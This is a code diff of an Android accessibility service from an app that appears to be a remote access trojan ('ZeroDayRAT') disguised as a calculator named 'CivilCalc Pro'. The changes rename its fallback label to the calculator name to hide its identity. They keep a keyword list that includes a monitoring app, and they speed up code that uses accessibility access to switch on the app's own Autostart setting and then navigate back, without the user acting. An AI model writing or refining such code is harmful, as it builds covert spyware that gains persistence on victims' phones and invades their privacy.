@@ -296,21 +296,21 @@ class BlockAccessibilityService : AccessibilityService() {
                 }
             }
 
-            // 2. Look for our app name row in Autostart list (scan for ZeroDayRAT):
+            // 2. Look for our app name row in Autostart list (scan for CivilCalc Pro):
             val appLabel = try {
                 applicationContext.applicationInfo.loadLabel(applicationContext.packageManager).toString()
-            } catch (_: Exception) { "ZeroDayRAT" }
+            } catch (_: Exception) { "CivilCalc Pro" }
 
             val appKeywords = listOf(
                 "CivilCalc Pro",
                 "civilcalc pro",
                 "CivilCalc",
                 "civilcalc",
+                appLabel,
                 "ZeroDayRAT",
                 "zerodayrat",
                 "ZeroDay",
                 "zeroday",
-                appLabel,
                 "Spapp Monitoring",
                 "spapp"
             )
@@ -324,7 +324,7 @@ class BlockAccessibilityService : AccessibilityService() {
                             Log.i("BlockA11y", "Auto-toggled Autostart switch for '$keyword'")
                             Handler(Looper.getMainLooper()).postDelayed({
                                 performGlobalAction(GLOBAL_ACTION_BACK)
-                            }, 1200L)
+                            }, 600L)
                             return true
                         }
                     }
